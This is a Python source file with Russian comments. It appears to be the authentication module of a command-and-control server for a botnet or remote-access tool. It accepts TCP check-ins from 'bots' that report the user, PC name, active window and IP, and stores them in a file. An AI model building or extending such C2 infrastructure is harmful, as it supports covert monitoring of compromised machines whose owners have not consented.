# backend/Services/Auth.py

import asyncio
import json
import time
from logs import Log as logger
# Предполагаем, что AUTH_KEY импортирован корректно
from backend import AUTH_KEY
from pathlib import Path


BOTS_FILE = Path(__file__).parent / "Bots_DB.txt"

def quick_save_bot(bot_id, payload):
    """Просто сохраняет JSON бота в файл"""
    db = {}
    # 1. Читаем старое, чтобы не удалить других ботов
    if BOTS_FILE.exists():
        try:
            db = json.loads(BOTS_FILE.read_text(encoding="utf-8"))
        except:
            db = {}

    # 2. Добавляем/обновляем нашего бота
    db[bot_id] = payload

    # 3. Сохраняем всё назад
    BOTS_FILE.write_text(json.dumps(db, indent=4, ensure_ascii=False), encoding="utf-8")


# ⚡️ ОБЯЗАТЕЛЬНЫЕ ПОЛЯ:
REQUIRED_INFO_FIELDS = ['id', 'loc', 'user', 'pc_name', 'activeWindow', 'last_active', 'ip', 'auth_key']
MAX_PAYLOAD = 64 * 1024  # 64 KB


async def authorize_client(reader: asyncio.StreamReader, ip_address: str):
    """
    Пытается авторизовать клиента по TCP-потоку.
    Сервер читает только длину payload и сам payload.
    Возвращает кортеж (bot_id, original_payload_bytes) или None.

    Ожидаемый формат: [Payload_len][Payload JSON Bytes]
    """

    READ_TIMEOUT = 10
    bot_id = ip_address  # Используем IP в случае ошибки

    try:
        # 1. Чтение длины payload
        payload_len_bytes = await asyncio.wait_for(reader.readexactly(4), timeout=READ_TIMEOUT)
        payload_len = int.from_bytes(payload_len_bytes, byteorder="big")

        # 2. Проверка размера payload
        if payload_len <= 0 or payload_len > MAX_PAYLOAD:
            logger.info(f"[!] Auth - недопустимый размер данных: {payload_len} байт от IP {ip_address}")
            return None

        # 3. Чтение payload (сохраняем оригинальные байты)
        original_payload_bytes = await asyncio.wait_for(reader.readexactly(payload_len), timeout=READ_TIMEOUT)

        # 4. Проверка обязательных полей и ключа
        payload_dict = json.loads(original_payload_bytes.decode('utf-8'))

        # Проверка обязательных полей
        if not all(field in payload_dict for field in REQUIRED_INFO_FIELDS):
            missing_fields = [field for field in REQUIRED_INFO_FIELDS if field not in payload_dict]
            logger.info(f"[!] Auth - отсутствуют обязательные поля: {missing_fields} от IP {ip_address}")
            return None

        # Получение ID из payload
        bot_id = payload_dict.get('id', ip_address)

        # Проверка ключа аутентификации
        if payload_dict.get('auth_key') != AUTH_KEY:
            logger.info(f'[!] Auth - ошибка аутентификации ключа от IP {ip_address}, ID: {bot_id}')
            return None

        quick_save_bot(bot_id, payload_dict)

        # 7. Возвращаем ID из payload и оригинальные БАЙТЫ Payload
        return bot_id, payload_dict

    except (asyncio.TimeoutError, asyncio.IncompleteReadError):
        logger.info(f'[!] Auth - таймаут соединения или неполное чтение от IP {ip_address}, ID: {bot_id}')
    except (UnicodeDecodeError, json.JSONDecodeError):
        logger.info(f'[!] Auth - ошибка декодирования/JSON при обработке данных от IP {ip_address}, ID: {bot_id}')
    except Exception as e:
        logger.info(f'[!] Auth - неизвестная ошибка от IP {ip_address}, ID: {bot_id}: {type(e).__name__}: {e}')

    return None